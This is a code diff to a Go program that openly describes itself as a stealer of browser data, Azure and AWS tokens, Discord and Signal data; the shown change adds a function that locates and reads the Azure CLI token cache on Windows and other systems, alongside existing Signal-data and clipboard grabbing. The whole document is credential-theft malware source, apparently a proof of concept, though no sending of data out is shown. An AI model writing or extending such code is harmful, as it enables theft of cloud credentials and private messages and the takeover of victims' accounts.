@@ -96,6 +96,22 @@ func GetSignalData() ([]byte, []byte, error) {
 	return keyFileData, databaseData, err
 }
 
+func GetAzureToken() ([]byte, error) {
+	tokenPath := ""
+	var tokenData []byte
+	var err error
+	switch runtime.GOOS {
+	case "windows":
+		tokenPath = os.Getenv("HOMEPATH")+"\\.azure\\accessTokens.json"
+	default:
+		tokenPath = os.Getenv("HOME")+"/.azure/msal_token_cache.json"
+	}
+	if _, err := os.Stat(tokenPath); err == nil {
+		tokenData,err = readFile(tokenPath)
+	}
+	return tokenData, err
+}
+
 func main () {
 	fmt.Println("On windows steal: browser code, look for azure and aws tokens in $HOME, Discord, Signal!")
 	fmt.Println("")
@@ -108,4 +124,7 @@ func main () {
 	text, err := glippy.Get()
 	CheckError(err)
 	fmt.Println("Clipboard :"+text)
+	azureToken, err := GetAzureToken()
+	CheckError(err)
+	fmt.Println(len(azureToken))
 }
